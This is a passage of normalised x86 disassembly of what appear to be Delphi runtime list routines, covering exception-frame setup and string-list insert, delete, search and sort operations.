lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_4148c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414998
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4146b4
xor eax eax
push ebp
push sub_414976
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41497d
mov eax [ ebp - 0x4 ]
call sub_414770
retn
sub_4149b4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4149f9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40436c
call sub_408484
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414a00
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_414a08
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414b13
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_403f44
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_403f9c
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b1a
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403ed0
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_40416c
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_40416c
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_40416c
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028c8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028c8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_40416c
mov ebx eax
test ebx ebx
je r-xdata
sub_414b30
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_414ba8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414baf
lea eax [ ebp - 0xc ]
call sub_403eac
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_414bbc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_414c7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_4043cc
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_41521c
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404094
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40be98
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c86
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403ed0
lea eax [ ebp - 0xc ]
call sub_403eac
retn
sub_414c90
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_414cc4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_414cf4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415d58
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414d3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d43
mov eax [ ebp - 0x4 ]
call sub_4030f0
retn
sub_414d48
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414de5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4146b4
xor eax eax
push ebp
push sub_414dc8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_4158a4
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_403f9c
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414dcf
mov eax [ ebp - 0x4 ]
call sub_414770
retn
sub_414df4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414e95
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414e9c
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
mov eax [ ebp - 0x4 ]
call sub_4146b4
xor eax eax
push ebp
push sub_414e78
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414770
retn
sub_414ea4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414edc
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414f80
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_417a94
mov eax [ ebp - 0x4 ]
call sub_4146b4
xor eax eax
push ebp
push sub_414f5b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_416b30
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418734
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414f62
mov eax [ ebp - 0x4 ]
call sub_414770
retn
sub_414f8c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415d58
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414fd7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414fde
mov eax [ ebp - 0x4 ]
call sub_4030f0
retn
sub_414fe4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415031
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40416c
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_415b08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415038
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_415044
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_405500
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_415078
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4150bb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4040a4
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4150c2
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_4150c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41517c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4146b4
xor edx edx
push ebp
push sub_41515f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415166
mov eax [ ebp - 0x4 ]
call sub_414770
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_403f9c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_41518c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415202
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_4192e0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_4192e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415209
lea eax [ ebp - 0xc ]
call sub_403eac
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_419388
inc esi
dec ebx
jne r-xdata
sub_415234
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_415250
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4144ec
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404928
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_4152b8
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414868
jmp r-xdata
sub_415354
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404928
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_415394
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414868
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404a14
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_415400
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414868
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_414868
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41545c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41545c
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_415480
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_4154f8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414868
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403f00
pop edi
pop esi
pop ebx
retn
sub_415534
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414868
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41555c
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_415590
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_414b30
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4155dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414868
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414868
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_415630
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41555c
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403f00
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028c8
sub_4156a8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414868
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414868
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403f00
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415704
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414868
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415744
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41545c
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_415744
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4157f4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_415850
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_415744
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_4158a4
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_4158d8
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_41593c
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_415990
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403040
lea eax [ ebp - 0x108 ]
